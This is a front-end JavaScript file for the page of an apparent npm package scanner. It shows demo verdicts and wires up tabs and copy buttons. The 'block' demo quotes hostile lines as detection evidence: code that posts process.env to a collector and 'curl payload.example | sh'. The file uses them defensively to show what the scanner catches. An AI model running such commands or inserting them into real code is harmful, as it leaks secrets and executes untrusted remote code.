const demos = {
  proceed: `$ npx npx-vibe --check is-number
✓ npx-vibe: Proceed  risk 0/100
is-number@7.0.0

Downloads: 172,392,690/week  Package age: 11y
Install hooks: none
Established signals: long registry history, high weekly adoption, linked GitHub repository
Registry popularity and age provide context, but never override code findings.
AI review: skipped (No heuristic trigger required model review.)

Action: package may be executed.`,
  caution: `$ npx npx-vibe --check esbuild
! npx-vibe: Caution  risk 43/100
esbuild@0.28.1

Downloads: 241,858,907/week  Package age: 3132d  Version age: 12d
Install hooks: postinstall
Established signals: long registry history, high weekly adoption, linked GitHub repository
Registry popularity and age provide context, but never override code findings.
AI review: skipped (Heuristic-only mode; AI was not requested.)

Findings:
- MEDIUM lifecycle_hook in package.json
  postinstall runs: node install.js
  Evidence: postinstall: node install.js
- MEDIUM network_and_shell in install.js
  Code combines network access with shell execution.
  Evidence line 147: fetch(url) ... child_process.execSync(...)

Action: review recommended before execution.`,
  block: `$ npx npx-vibe --check sketchy-helper
✕ npx-vibe: Block  risk 100/100
sketchy-helper@0.0.3

Downloads: 12/week  Package age: <1d
Install hooks: postinstall
AI review: skipped (Heuristic-only mode; AI was not requested.)

Findings:
- CRITICAL possible_secret_exfiltration in setup.js
  Code accesses environment secrets and performs network activity.
  Evidence line 8: fetch(collector, { body: JSON.stringify(process.env) })
- CRITICAL download_and_execute in postinstall.js
  External content is piped to a shell.
  Evidence line 3: curl payload.example | sh

Action: blocked unless --force is supplied.`
};

const output = document.querySelector("#demo-output");
const tabs = document.querySelectorAll(".demo-tab");

function setDemo(name) {
  if (!output || !demos[name]) return;
  output.textContent = demos[name];
  tabs.forEach((tab) => tab.classList.toggle("active", tab.dataset.demo === name));
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => setDemo(tab.dataset.demo));
});

setDemo("proceed");

document.querySelectorAll("[data-copy]").forEach((copyButton) => {
  const defaultText = copyButton.textContent;

  copyButton.addEventListener("click", async () => {
    const text = copyButton.dataset.copy;
    try {
      await navigator.clipboard.writeText(text);
      copyButton.textContent = "Copied";
    } catch {
      copyButton.textContent = "Copy failed";
    }

    setTimeout(() => {
      copyButton.textContent = defaultText;
    }, 1300);
  });
});

const observer = new IntersectionObserver(
  (entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.classList.add("visible");
        observer.unobserve(entry.target);
      }
    });
  },
  { threshold: 0.16 }
);

document.querySelectorAll(".reveal").forEach((element) => observer.observe(element));
